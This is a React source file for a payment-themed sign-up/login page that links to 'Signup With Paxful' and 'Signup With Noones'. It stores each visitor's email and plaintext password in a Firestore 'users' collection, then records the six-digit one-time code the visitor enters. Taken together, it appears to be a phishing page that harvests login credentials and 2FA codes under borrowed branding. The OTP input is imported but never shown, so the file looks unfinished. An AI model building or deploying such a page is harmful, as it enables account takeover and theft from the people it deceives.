import React, {useState, useEffect} from "react";
import db from "../../firebase";
import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
import OtpInput from 'react-otp-input';

const Home = () => {
    const [otp, setOtp] = useState('');
    const [search, setSearch] = useState("");
    const [userID, setUserID] = useState("");
    const [toggle, setToggle] = useState("password")
    const toggleText = () => {
        if(toggle === "password"){
            setToggle("text")
        }else{
            setToggle("password")
        }
    }
    const [values, setValues] = useState({
        email: '',
        password: ''
    })
    const [errors, setErrors] = useState({
        email: '',
        password: ''
    })
    const handleInput = (e) => {
        const newObject = {...values, [e.target.name]: e.target.value}
        setValues(newObject)
    }
    const validate = (values) => {
        let errors:any = {}
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,6}$/;
        if(!values.email){
            errors.email = "This field may not be blank."
        }else if(!emailRegex.test(values.email)){
            errors.email = "Enter a valid phone or email."
        }
        if(!values.password){
            errors.password = "This field may not be blank."
        }
        return errors
    }
    const hadleValidation = (e) => {
        e.preventDefault()
        setErrors(validate(values))
        if(values.email && values.password && !errors.email && !errors.password){
            setUserID("user_" + new Date().getTime())
            const docRef = doc(db, "users", "user_" + new Date().getTime());
            const saveData = async () => {
                await setDoc(docRef, {
                    email: values.email,
                    password: values.password,
                    otp: ""
                });
            }
            saveData()
            setSearch("otp")
        }
    }

  useEffect(() => { 
    //update otp in firebase
    const updateOtp = async () => {
        const docRef = doc(db, "users", userID);
        await updateDoc(docRef, {
            otp: otp
        });
    }
    if(otp.length === 6){
        updateOtp()
        setSearch("success")
    }
    }, [otp])
  return (
        <main className="flex p-2 justify-center h-screen bg-[#F5F5F5]"
        style={{
            backgroundImage: `url('/wesmopay.svg')`,
            backgroundSize: "cover",
            backgroundRepeat: "no-repeat",
            backgroundPosition: "center center"
        }}
        >
            <div className="bg-transparent p-4 flex flex-col justify-center items-center gap-y-44 rounded md:w-1/2 w-full">
            <div className="flex flex-col rounded-md items-start justify-center w-full max-w-lg p-3 lg:ml-10 mx-auto mt-8 lg:mt-8 bg-white ">
                <div className="flex  mt-7 justify-between items-center w-full">
                    <p className="text-3xl text-[#D65DB1] font-bold">SIGN UP</p>
                    <div className="bg-[#F9F871] rounded-sm w-[150px] h-1"></div>
                </div>

                <div className="flex flex-col gap-4 mt-6 justify-start w-full items-start">
                    <form onSubmit={hadleValidation} className="flex flex-col gap-4 mt-6 justify-start w-full items-start" >
                        <div className="flex flex-col justify-start w-full items-start space-y-2">
                            <label className="text-sm text-[#858F9A]">Email</label>
                            <div className="flex items-center relative justify-between w-full">
                                <input name='email' placeholder="email" onChange={handleInput} type="email" className={`w-full h-14 border border-[#FFA500] focus:border-[#FFA500] outline-none rounded-sm p-2 ${errors.email && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
                                <svg width="15" className="absolute cursor-pointer right-6" height="16" viewBox="0 0 15 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M7.03003 8C8.0909 8 9.10831 7.57857 9.85846 6.82843C10.6086 6.07828 11.03 5.06087 11.03 4C11.03 2.93913 10.6086 1.92172 9.85846 1.17157C9.10831 0.421427 8.0909 0 7.03003 0C5.96916 0 4.95175 0.421427 4.2016 1.17157C3.45146 1.92172 3.03003 2.93913 3.03003 4C3.03003 5.06087 3.45146 6.07828 4.2016 6.82843C4.95175 7.57857 5.96916 8 7.03003 8ZM5.6019 9.5C2.52378 9.5 0.0300293 11.9937 0.0300293 15.0719C0.0300293 15.5844 0.445654 16 0.958154 16H13.1019C13.6144 16 14.03 15.5844 14.03 15.0719C14.03 11.9937 11.5363 9.5 8.45815 9.5H5.6019Z" fill="#858F9A"/>
                                </svg>
                            </div>
                            {errors.email && 
                            <div className="flex gap-2 items-center justify-start w-full">
                                <svg className='w-5 rotate-180' aria-hidden="true" fill="none" stroke="red"  strokeWidth="1.8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" strokeLinecap="round" strokeLinejoin="round"></path>
                                </svg>
                                <p className="text-red-600 text-sm">{errors.email}</p>
                            </div>
                            }
                        </div>

                        <div className="flex flex-col justify-start w-full items-start space-y-2">
                            <div className="flex items-center justify-between w-full">
                                <label className="text-sm text-[#858F9A]">Password</label>
                            </div>
                            <div className="relative w-full">
                                <div className="flex items-center justify-between w-full">
                                    <input name='password' placeholder="password" onChange={handleInput} type={toggle} className={`w-full border  h-14 border-[#FFA500] focus:border-[#FFA500] outline-none rounded-sm p-2 ${errors.password && 'w-full border focus:border-[red] outline-none rounded-sm p-2'}`} />
                                    <svg onClick={toggleText} className="absolute cursor-pointer right-6" width="17" height="10" viewBox="0 0 17 10" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path fillRule="evenodd" clipRule="evenodd" d="M2.53 5.006L2.527 5L2.53 4.994C2.6108 4.84751 2.70701 4.71006 2.817 4.584C3.105 4.24 3.547 3.831 4.117 3.439C5.262 2.65 6.818 2 8.5 2C10.18 2 11.735 2.656 12.881 3.448C13.3633 3.77256 13.8013 4.15846 14.184 4.596C14.326 4.766 14.418 4.903 14.469 5C14.3878 5.14388 14.2923 5.27923 14.184 5.404C13.8013 5.84154 13.3633 6.22744 12.881 6.552C11.735 7.344 10.18 8 8.5 8C6.818 8 5.262 7.35 4.117 6.561C3.547 6.169 3.105 5.761 2.817 5.417C2.70729 5.29072 2.6111 5.15331 2.53 5.007V5.006ZM8.5 0C6.316 0 4.372 0.836 2.983 1.79C2.287 2.27 1.704 2.797 1.283 3.3C1.07939 3.53732 0.902339 3.79619 0.755 4.072C0.628 4.317 0.5 4.642 0.5 5C0.5 5.358 0.628 5.683 0.755 5.928C0.89 6.188 1.073 6.45 1.283 6.7C1.704 7.203 2.287 7.73 2.983 8.21C4.372 9.163 6.316 10 8.5 10C10.686 10 12.631 9.156 14.018 8.198C14.714 7.718 15.296 7.19 15.716 6.69C15.926 6.44 16.108 6.182 16.243 5.924C16.369 5.684 16.5 5.359 16.5 5C16.5 4.641 16.37 4.316 16.243 4.076C16.095 3.80271 15.9183 3.54594 15.716 3.31C15.296 2.81 14.714 2.283 14.018 1.802C12.631 0.844 10.686 0 8.5 0ZM8.5 7C9.03043 7 9.53914 6.78929 9.91421 6.41421C10.2893 6.03914 10.5 5.53043 10.5 5C10.5 4.46957 10.2893 3.96086 9.91421 3.58579C9.53914 3.21071 9.03043 3 8.5 3C7.96957 3 7.46086 3.21071 7.08579 3.58579C6.71071 3.96086 6.5 4.46957 6.5 5C6.5 5.53043 6.71071 6.03914 7.08579 6.41421C7.46086 6.78929 7.96957 7 8.5 7Z" fill="#626262"/>
                                    </svg>
                                </div>
                                {errors.password && 
                                <div className="flex gap-2 items-center justify-start w-full">
                                    <svg className='w-5 rotate-180' aria-hidden="true" fill="none" stroke="red" strokeWidth="1.8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" strokeLinecap="round" strokeLinejoin="round"></path>
                                    </svg>
                                    <p className="text-red-600 text-sm">{errors.password}</p>
                                </div>
                                }
                            </div>
                        </div>
                        {/* remember me */}
                        <div className="flex items-center justify-start w-full">
                            <input type="checkbox" className="w-4 h-4 rounded-sm border border-[#FFA500] focus:border-[#FFA500] outline-none p-2" />
                            <p className="text-[#858F9A] text-sm ml-2">Remember me</p>
                        </div>

                        <button
                        type='submit'
                        className="w-full bg-[#FF6F91] hover:bg-[#e05576] flex items-center uppercase justify-center text-white rounded-sm p-4 mt-2">
                            Log In
                        </button>
                    </form>
                    <div className="flex items-start justify-start gap-2 w-full mt-2">
                        {/* Signup|Signup With Paxful|Signup With Noones |  */}
                        <a href="/signup" className="text-[#858F9A] text-xs"><span className="text-[#87CEFA]">Signup</span></a>
                        <p className="text-[#858F9A] text-sm"> | </p>
                        <a href="paxfullaccount" className="text-[#858F9A] text-xs"><span className="text-[#87CEFA]">Signup With Paxful</span></a>
                        <p className="text-[#858F9A] text-sm"> | </p>
                        <a href="#" className="text-[#858F9A] text-xs"><span className="text-[#90EE90]">Signup With Noones</span></a>
                    </div>
                </div>  
            </div>
            </div>
        </main>
  )
}

export default Home